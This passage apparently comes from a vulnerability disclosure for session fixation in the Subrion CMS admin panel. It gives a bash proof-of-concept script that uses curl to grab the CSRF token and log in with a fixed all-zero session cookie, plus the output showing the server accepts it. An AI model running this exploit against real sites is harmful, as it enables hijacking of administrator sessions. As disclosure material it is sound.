The attack may be launched remotely. No form of authentication is required for exploitation. Technical details are known but no exploit is publicly available.

## Proof-of-Concept

**Sample affected URL**

* http://subrion.local/panel/

Submitting a valid login with a crafted session ID, causes the ID to be reflected and set as a valid session identifier.

The following [script](https://github.com/belong2yourself/vulnerabilities/blob/master/docs/Subrion%20CMS/Session%20Fixation/sess_fix.sh) may be used to easily verify the vulnerability:

```bash
#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"

# Grep Session Cookie Name
sess_cookie_name=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*")
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Fix the Session Cookie Value and login
curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "Cookie: loader=loaded; $sess_cookie_name=00000000000000000000000000" -i | grep "Set-Cookie"

```

Using the above script should give the following output, proving the vulnerability.

```
$ ./sess_fix.sh
Set-Cookie: INTELLI_06c8042c3d=00000000000000000000000000; expires=Sun, 12-Apr-2020 16:07:44 GMT; Max-Age=1800; path=/
Set-Cookie: salt=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
```
